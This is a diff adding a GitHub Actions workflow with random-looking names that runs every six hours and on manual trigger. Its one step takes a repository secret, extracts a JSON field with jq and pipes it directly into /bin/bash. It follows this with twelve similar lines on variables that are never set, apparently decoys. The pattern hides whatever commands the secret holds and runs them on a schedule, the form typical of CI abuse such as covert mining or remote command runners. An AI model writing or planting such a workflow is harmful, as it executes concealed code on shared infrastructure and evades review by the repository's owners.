@@ -1,0 +1,29 @@
+name: leijifeiwdjd
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: leijifeiwdjd
+        env:
+          f417: ${{ secrets.f417 }}
+        run: |
+          echo $f417 | jq -r .c53178 | /bin/bash
+          echo $ocav16 | jq -r .z20672 | /bin/bash
+          echo $ryrm5399 | jq -r .xn699 | /bin/bash
+          echo $f1 | jq -r .jlqje8 | /bin/bash
+          echo $opkzt2 | jq -r .iz8761 | /bin/bash
+          echo $wsbt70597 | jq -r .xu09758 | /bin/bash
+          echo $fp3017 | jq -r .u56635 | /bin/bash
+          echo $mda883 | jq -r .kcpe411 | /bin/bash
+          echo $j95 | jq -r .h43 | /bin/bash
+          echo $qjdtv174 | jq -r .vmjol7 | /bin/bash
+          echo $y5672 | jq -r .aq73179 | /bin/bash
+          echo $jx1441 | jq -r .xt533 | /bin/bash
+          echo $ffok40169 | jq -r .alw74 | /bin/bash
+
